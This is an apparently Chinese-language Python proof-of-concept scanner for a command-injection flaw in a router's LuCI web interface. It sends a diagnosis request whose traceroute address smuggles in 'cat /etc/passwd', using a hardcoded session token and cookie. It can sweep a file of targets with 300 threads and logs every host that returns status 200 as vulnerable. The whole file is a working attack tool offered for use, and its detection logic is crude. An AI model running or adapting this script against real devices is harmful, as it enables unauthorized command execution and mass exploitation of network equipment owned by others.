import requests,argparse,time,sys




from multiprocessing.dummy import Pool





requests.packages.urllib3.disable_warnings() # 解除警告





GREEN = '\033[92m'
RESET = '\033[0m'
proxies = { 
       "http": "http://127.0.0.1:8080"



, 



       "https": "http://127.0.0.1:8080"

 



       }
def banner():
	banner = """
  __   __   __  ___   __  _  _   _ _   _ 
 / / _ \ \ /  \/ / | /  \| || | | | | | |
| |_/ \_| ( ()  <| || || ) || |_| | |_| |
 \___^___/ \__/\_\\_   _/ \_) ._,_|\___/ 
                    | |     | |          
                    |_|     |_|          wh
	"""
	print(banner)
def poc(target):
	payload_url = "/cgi-bin/luci/;stok=9ba3cc411c1cd8cf7773a2df4ec43d65/admin/diagnosis?diag=tracert&tracert_address=127.0.0.1%3Bcat+%2Fetc%2Fpasswd&seq=1"
	url = target + payload_url
	headers={
		'User-Agent':'Mozilla/5.0(WindowsNT10.0;Win64;x64;rv:109.0)Gecko/20100101Firefox/115.0'

,
		'Accept':'*/*',
		'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'


,
		'Accept-Encoding':'gzip,deflate'



,
		'X-Requested-With':'XMLHttpRequest'
,
		'DNT':'1',
		'Connection':'close',
		'Referer':'http://IP:PORT/cgi-bin/luci/;stok=9ba3cc411c1cd8cf7773a2df4ec43d65/admin/diagnosis'
		'Cookie':'sysauth=b0d95241b0651d5fbaac5de8dabd2110'
	}	
	try:  
		res = requests.get(url=target, verify=False)  # 第一次请求  
		res1 = requests.get(url=url, headers=headers, timeout=5, verify=False)  # 第二次请求  
		if res.status_code == 200:  
			if res1.status_code == 200:  
				print(f"{GREEN}[+]该url存在命令执行漏洞:{target}{RESET}"
)  
				with open("result.txt", "a", encoding="utf-8") as f:  
					f.write(target + "\n"
)  
			else:  
				print(f"[-]该url不存在命令执行漏洞(但第一个URL响应成功):{target}"
)  
		else:  
			print(f"该url连接失败:{target}"
)  
	except requests.RequestException as e:  
		print(f"[*]该url出现错误:{target}，错误信息：{e}"
) 
def main():
	banner()
	parser = argparse.ArgumentParser()
	parser.add_argument("-u","--url",dest="url",type=str,help="please write link"

)
	parser.add_argument("-f","--file",dest="file",type=str,help="please write file\'path"

)
	args = parser.parse_args()
	if args.url and not args.file:


		poc(args.url)
	elif args.file and not args.url:


		url_list = []
		with open(args.file,"r",encoding="utf-8") as f:


			for i in f.readlines():


				url_list.append(i.strip().replace("\n"

,""))
		mp = Pool(300)
		mp.map(poc,url_list)


		mp.close()
		mp.join()
	else:
		print(f"\n\tUage:python {sys.argv[0]} -h"

)
if __name__ == "__main__":
	main()
